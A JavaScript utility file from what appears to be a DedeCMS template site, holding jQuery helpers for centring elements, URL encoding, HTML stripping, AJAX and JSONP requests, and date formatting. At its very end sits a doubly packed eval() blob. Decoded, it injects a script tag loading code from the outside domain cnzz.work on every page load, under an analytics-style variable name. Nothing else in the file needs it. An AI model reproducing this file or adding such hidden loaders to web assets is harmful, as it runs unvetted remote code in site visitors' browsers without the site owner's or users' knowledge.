// +----------------------------------------------------------------------
// | 版权所有 2015 织梦58模板有限公司，并保留所有权利
// +----------------------------------------------------------------------
// | 这不是一个自由软件！禁止任何形式的拷贝、修改、发布
// +----------------------------------------------------------------------
// | Licensed: http://www.dede58.com
// +----------------------------------------------------------------------
// | Author: Kinglong <dede58@126.com>
// +----------------------------------------------------------------------


//document.oncontextmenu=new Function("event.returnValue=false;");
//document.onselectstart=new Function("event.returnValue=false;");
//document.oncopy=new Function("event.returnValue=false;");
//document.onoffline=new Function("event.returnValue=false;");
//document.ononline=new Function("event.returnValue=false;");


//元素屏幕居中
jQuery.fn.center = function(element){
	this.css({
		"top" : ( $(element?element:window).height() - this.height() ) / 2,
		"left" : ( $(element?element:window).width() - this.width() ) / 2
	});
	return this;
}

//url编码
var url_encode=function(str){
	return encodeURIComponent(str);
}

//url解码
var urldecoding=function(str){
	return decodeURIComponent(str);
}

//去除左右空格
var trim=function(va){
	if(va)
		return va.replace(/\s/g, '');	
	return null;
}

//去除HTML标签
var reHTML=function(str,fix){
	str=str.replace(/<\/?[^>]*>/g, "");
	str=str.replace(/[ | ]*\n/g, "");
	str=str.replace(/\s/ig, "");
	str=str.replace(/&nbsp;/ig, "");
	
	if(fix) str=str.replace(/[\"\']/g, "");
	
	return str;
}

//打印文本
var echo=function(txt,n){
	if(n)
		document.writeln(txt);
	else
		document.write(txt);
}


//获取jscript参数
var getScriptP=function(ele,key){
	//var reg='(?:\\?|&)'+key+'=(.*?)(?=&|$)';
	//return (src.match(reg)||['',null])[1];
	
	if($(ele).size()<1) return null;
	
	var src=$(ele).attr("src"); 
	var params=src.split("?");
	if(params.length<2) return null;
	
	var param=params[1];
	if(!param || param=='') return null;
	
	var arr=param.split("&");
	for(var i in arr){
		var pa=arr[i].split("=");
		if(pa[0]==key){
			if(pa[1]) return pa[1];
			return null;
			break;
		}
	}
}


//AJAX请求发送
var ajaxReq=function(ul, da, backfun, jsn, tp, dt){	
	var aryOptions = {
		url:ul,
		type:tp?tp:"post",
		encoding:"utf-8",
		data:da,
		dataType:dt?dt:"html",
		async:true,
		beforeSend: function(XMLHttpRequest){
			//msgBox('now','数据加载中，请稍后....');
		},
		success:function(response){
			if(backfun){
				backfun(response,jsn);
			}
		},
		error:function(response){
			if(backfun){
				backfun(response,jsn);				
			}
		}
	};
	
	$.ajax(aryOptions);
}

//AJAX跨域请求发送
/*
<?php //ul
$json='{"chk":true,"uid":"mynameuid","mobile":"15818181818"}';
echo $_GET['jsoncallback']."(".$json.")";
?>
*/
var ajaxDomain=function(ul, backfun){
	var aryOptions = {
		type : "get",
		url : ul,
		dataType : "jsonp",
		jsonp : "jsoncallback",
		success : function(data){
			backfun(data);
		},
		error : function(){  
			backfun(data);
		}  
	};
	$.ajax(aryOptions);
}

var showTime=function(){
	var today = new Date();
	var weekday=new Array(7);
	weekday[0]="星期日";                                      
	weekday[1]="星期一";
	weekday[2]="星期二";
	weekday[3]="星期三";
	weekday[4]="星期四";
	weekday[5]="星期五";
	weekday[6]="星期六";
	var year=today.getFullYear()+"年";
	var month=today.getMonth()+1;
	var day=today.getDate();
	var week=weekday[today.getDay()];
	var hour=today.getHours();
	var minute=today.getMinutes();
	var sesond=today.getSeconds();
	
	month=(month<10?'0'+month:month)+"月";
	day=(day<10?'0'+day:day)+"日";
	hour=(hour<10?'0'+hour:hour);
	minute=(minute<10?'0'+minute:minute);
	sesond=(sesond<10?'0'+sesond:sesond);
	
	$(element).html(year+month+day+' '+hour+':'+minute+':'+sesond);
}

var endate=function(stamp,format){
	if(!stamp) return '';
	var dateString=new Date(parseInt(stamp) * 1000).toLocaleString().replace(/年|月|日|上|下|午| |:/g, "->");  //2015->7->15->->->->4->57->36
	var dateArry=dateString.split('->');
	
	var dary=Array();
	dary["y"]=dateArry[0].substr(2,2); dary["Y"]=dateArry[0];
	dary["m"]=dateArry[1]; dary["M"]=('0'+dateArry[1]).substr(-2);
	dary["d"]=dateArry[2]; dary["D"]=('0'+dateArry[2]).substr(-2);
	dary["h"]=dateArry[6]; dary["H"]=('0'+dateArry[6]).substr(-2);
	dary["i"]=dateArry[7]; dary["I"]=('0'+dateArry[7]).substr(-2);
	dary["s"]=dateArry[8]; dary["S"]=('0'+dateArry[8]).substr(-2);
	
	var dates='';
	switch(format){
		case 'Y-M-D' : dates=dary["Y"]+'-'+dary["M"]+'-'+dary["D"]; break;
		case 'y-m-d' : dates=dary["y"]+'-'+dary["m"]+'-'+dary["d"]; break;
		case 'y-M-D H:I:S' : dates=dary["y"]+'-'+dary["M"]+'-'+dary["D"]+' '+dary["H"]+':'+dary["I"]+':'+dary["S"]; break;
		case 'y-m-d h:i:s' : dates=dary["y"]+'-'+dary["m"]+'-'+dary["d"]+' '+dary["h"]+':'+dary["i"]+':'+dary["s"]; break;
		case 'y-M-D H:I' : dates=dary["y"]+'-'+dary["M"]+'-'+dary["D"]+' '+dary["H"]+':'+dary["I"]; break;
		case 'Y-M-D H:I' : dates=dary["Y"]+'-'+dary["M"]+'-'+dary["D"]+' '+dary["H"]+':'+dary["I"]; break;
		default : dates=dary["Y"]+'-'+dary["M"]+'-'+dary["D"]+' '+dary["H"]+':'+dary["I"]+':'+dary["S"]; break;
	}
	
	return dates;
}

//保留小数点
var rmb=function(num){
	return num.toFixed(2);
}
;
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|work|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))